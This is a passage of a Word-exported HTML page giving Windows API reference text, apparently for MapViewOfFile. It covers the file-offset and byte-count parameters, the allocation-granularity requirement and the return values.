<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwFileOffsetHigh,<span style="mso-spacerun: yes">     </span>//
high-order 32 bits of file offset<span style="mso-spacerun: yes">       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwFileOffsetLow,<span style="mso-spacerun: yes">      </span>//
low-order 32 bits of file offset<span style="mso-spacerun: yes">        
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwNumberOfBytesToMap<span style="mso-spacerun: yes">  </span>//
number of bytes to map<span style="mso-spacerun: yes">                  
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">            </span><span style="mso-spacerun:
yes">                                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFileMappingObject: Identifies an open handle of a file-mapping object.
The CreateFileMapping and OpenFileMapping functions return this handle. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwDesiredAccess: Specifies the type of access to the file view and,
therefore, the protection of the pages mapped by the file.<span
style="mso-spacerun: yes">           </span><span style="mso-spacerun:
yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwFileOffsetHigh: Specifies the high-order 32 bits of the file
offset<span style="mso-spacerun: yes">  </span>where mapping is to begin.<span
style="mso-spacerun: yes">                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                          </span><span style="mso-spacerun:
yes">                                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwFileOffsetLow: Specifies the low-order 32 bits of the file offset
where mapping is to begin. The combination of the high and low offsets must
specify an offset within the file that matches the system's memory<span
style="mso-spacerun: yes">  </span>allocation granularity, or the function
fails. That is, the offset must be a multiple of the allocation granularity.
Use the GetSystemInfo function, which fills in the members of a SYSTEM_INFO
structure, to<span style="mso-spacerun: yes">  </span>obtain the system's
memory allocation granularity.<span style="mso-spacerun:
yes">                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwNumberOfBytesToMap: Specifies the number of bytes of the file to
map.If dwNumberOfBytesToMap is zero, the entire file is mapped.<span
style="mso-spacerun: yes">       </span><span style="mso-spacerun:
yes">      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is the starting address
of<span style="mso-spacerun: yes">   </span>the mapped view. <span
style="mso-spacerun:
yes">                                                       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is NULL. To get extended
error<span style="mso-spacerun: yes">  </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

</div>

</body>

</html>
